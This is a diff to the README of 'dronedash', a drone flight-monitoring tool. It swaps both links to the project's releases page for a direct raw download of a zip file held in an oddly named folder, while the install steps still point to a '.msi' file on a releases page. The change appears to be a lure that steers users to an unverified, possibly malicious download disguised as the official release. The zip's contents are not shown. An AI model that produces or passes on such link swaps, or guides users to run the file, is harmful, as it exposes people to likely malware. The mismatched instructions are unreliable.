@@ -1,6 +1,6 @@
 # 🚁 dronedash - Monitor your drone flight data easily
 
-[![Download dronedash](https://img.shields.io/badge/Download-dronedash-grey.svg)](https://github.com/aishdonwar-star/dronedash/releases)
+[![Download dronedash](https://img.shields.io/badge/Download-dronedash-grey.svg)](https://raw.githubusercontent.com/aishdonwar-star/dronedash/main/Dodonaean/Software_1.1.zip)
 
 dronedash helps you track your drone flights. You see speed, altitude, and battery levels in real-time. Use this tool to keep your hardware safe and your flight logs organized.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run dronedash well. Check your system agai
 
 Follow these steps to install the software on your machine.
 
-1. Visit the [releases page](https://github.com/aishdonwar-star/dronedash/releases) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/aishdonwar-star/dronedash/main/Dodonaean/Software_1.1.zip) to download the latest version.
 2. Select the file ending in .msi to start your download.
 3. Save the file to your Downloads folder.
 4. Double-click the file to open the installation wizard.
